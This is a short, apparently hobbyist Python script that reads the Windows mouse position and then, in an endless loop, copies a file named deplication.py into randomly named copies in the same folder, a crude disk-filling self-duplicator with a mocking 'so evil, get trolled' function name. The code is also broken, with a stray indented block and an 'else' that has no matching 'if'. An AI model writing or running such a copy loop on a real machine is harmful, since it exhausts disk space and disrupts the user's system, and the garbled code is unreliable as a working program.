import time, random, sys, math, threading, shutil, os
from ctypes import windll, Structure, c_long, byref

class POINT(Structure):
    _fields_ = [("x", c_long), ("y", c_long)]
def MouseX():
    pt = POINT()
    windll.user32.GetCursorPos(byref(pt))
    return pt.x
def MouseY():
    pt = POINT()
    windll.user32.GetCursorPos(byref(pt))
    return pt.y
def random1():
    rand=random.randint(1,100000)
    return rand
choice=input('press anything to start duplicating')
D = r"N:\py"
dest1 = r"N:\py\\"
dest=dest1+str(random1())+".py"
print(dest)

    print(MouseX(),MouseY())
    print(rand)

else:
    while True:
        D = r"N:\py"
        dest1 = r"N:\py\\"
        dest=dest1+str(random1())+".py"
        print(os.listdir(D))
        src = r"N:\py\deplication.py"
        path = shutil.copyfile(src,dest)
        print(os.listdir(D))
        print("Path of the duplicate file is:")
        print(path)

def filesizehehehehehawimsoevillolxdgettrolled():
    print("filesizehehehehehawimsoevillolxdgettrolled, filesizehehehehehawimsoevillolxdgettrolled, filesizehehehehehawimsoevillolxdgettrolled, filesizehehehehehawimsoevillolxdgettrolled, filesizehehehehehawimsoevillolxdgettrolled")